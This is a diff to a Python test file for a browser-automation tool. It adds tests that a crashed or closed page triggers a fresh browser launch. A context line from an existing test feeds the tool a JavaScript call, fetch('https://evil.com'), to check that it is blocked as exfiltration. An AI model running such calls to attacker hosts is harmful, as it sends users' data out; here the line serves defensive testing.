@@ -8,6 +8,8 @@ and the handler behaviour against a fake page — no real Chrome is launched.
 
 from __future__ import annotations
 
+import asyncio
+
 import pytest
 
 from modus.config import ModusConfig
@@ -128,6 +130,9 @@ class _FakePage:
     def __init__(self):
         self.url = "about:blank"
 
+    def is_closed(self):
+        return False
+
     async def goto(self, url, **kw):
         self.url = url
         return None
@@ -210,6 +215,121 @@ async def test_eval_runs_and_blocks_exfil(fake_browser):
     blocked = await fake_browser.browser_eval({"js": "fetch('https://evil.com')"}, ctx)
     assert blocked.is_error
     assert "blocked" in blocked.content
+
+
+# ── crash recovery: dead page triggers a fresh browser ──
+
+
+class _ClosingPage(_FakePage):
+    """A page that dies (is_closed / renderer gone) on the next probe."""
+
+    def __init__(self):
+        super().__init__()
+        self._dead = False
+
+    def die(self):
+        self._dead = True
+
+    def is_closed(self):
+        return self._dead
+
+    async def title(self):
+        if self._dead:
+            raise RuntimeError("Target page, context or browser has been closed")
+        return "Fake Title"
+
+
+class _FakePlaywright:
+    def __init__(self, pages):
+        self.pages = pages
+        self.closed = 0
+
+    async def start(self):
+        return self
+
+    async def stop(self):
+        return None
+
+    async def launch(self, **kw):
+        return self
+
+    async def new_context(self, **kw):
+        return self
+
+    async def new_page(self):
+        return self.pages.pop(0)
+
+    async def close(self):
+        self.closed += 1
+
+
+@pytest.mark.asyncio
+async def test_browser_relaunch_on_closed(monkeypatch):
+    """A closed/crashed page is recycled: next call gets a fresh browser."""
+    import modus.tools.browser as b
+
+    dead = _ClosingPage()
+    dead.die()  # page closed / renderer gone
+    fresh = _FakePage()
+    pw = _FakePlaywright([fresh])
+
+    async def _fake_launch():
+        return _holder_from(pw, fresh)
+
+    monkeypatch.setattr(b, "_launch_browser", _fake_launch)
+    lock = asyncio.Lock()
+    monkeypatch.setattr(b, "_browser_lock", lock)
+    monkeypatch.setattr(b, "_holder", {"pw": pw, "browser": pw, "context": pw, "page": dead})
+
+    page = await b._ensure_browser()
+    # The dead page was detected and a fresh one launched.
+    assert page is fresh
+    assert b._holder is not None
+    assert b._holder["page"] is fresh
+    assert pw.closed == 1  # the dead browser was closed before relaunch
+
+
+@pytest.mark.asyncio
+async def test_browser_relaunch_when_renderer_crashed(monkeypatch):
+    """A renderer crash (title raises) also triggers a recycle."""
+    import modus.tools.browser as b
+
+    dead = _ClosingPage()
+    dead.die()
+    fresh = _FakePage()
+    pw = _FakePlaywright([fresh])
+
+    async def _fake_launch():
+        return _holder_from(pw, fresh)
+
+    monkeypatch.setattr(b, "_launch_browser", _fake_launch)
+    lock = asyncio.Lock()
+    monkeypatch.setattr(b, "_browser_lock", lock)
+    monkeypatch.setattr(b, "_holder", {"pw": pw, "browser": pw, "context": pw, "page": dead})
+
+    page = await b._ensure_browser()
+    assert page is fresh
+    assert pw.closed == 1
+
+
+@pytest.mark.asyncio
+async def test_browser_healthy_page_reused(monkeypatch):
+    """A live page is returned as-is, no relaunch."""
+    import modus.tools.browser as b
+
+    alive = _FakePage()
+    pw = _FakePlaywright([])
+    lock = asyncio.Lock()
+    monkeypatch.setattr(b, "_browser_lock", lock)
+    monkeypatch.setattr(b, "_holder", {"pw": pw, "browser": pw, "context": pw, "page": alive})
+
+    page = await b._ensure_browser()
+    assert page is alive
+    assert pw.closed == 0
+
+
+def _holder_from(pw, page):
+    return {"pw": pw, "browser": pw, "context": pw, "page": page}
 
 
 @pytest.mark.asyncio
